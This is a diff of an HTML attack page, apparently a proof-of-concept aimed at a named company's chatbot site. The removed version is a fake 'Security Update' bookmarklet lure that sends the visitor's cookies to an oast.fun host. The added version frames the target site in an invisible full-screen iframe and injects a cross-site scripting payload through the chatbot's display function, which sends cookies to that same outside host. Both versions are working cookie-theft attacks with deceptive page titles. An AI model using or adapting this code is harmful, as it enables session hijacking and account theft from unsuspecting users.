@@ -1,20 +1,25 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Update</title>
+    <title>Loading...</title>
+    <style>
+        iframe {
+            opacity: 0;  /* Make the iframe invisible */
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+        }
+    </style>
 </head>
 <body>
-    <h1>Enable Enhanced Security!</h1>
-    <p>To get important security updates, please drag the following link to your bookmarks:</p>
+    <iframe src="https://nanoa.semiconductor.samsung.com"></iframe>
     <script>
-        (function() {
-            let bookmark = document.createElement("a");
-            bookmark.href = "javascript:fetch('https://fmnajncjltvbbciapiyqhnx5im8yoyqgp.oast.fun/steal?cookie='+document.cookie)";
-            bookmark.innerText = "Click for Security Update"; 
-            document.body.appendChild(bookmark);
-        })();
+        setTimeout(() => {
+            let iframe = document.querySelector("iframe").contentWindow;
+            iframe.eval("CHATBOT.displayUserInput('<img src=x onerror=new Image().src=`https://fmnajncjltvbbciapiyqhnx5im8yoyqgp.oast.fun?cookie=${document.cookie}`>');");
+        }, 3000);  // Give time for iframe to load
     </script>
 </body>
 </html>
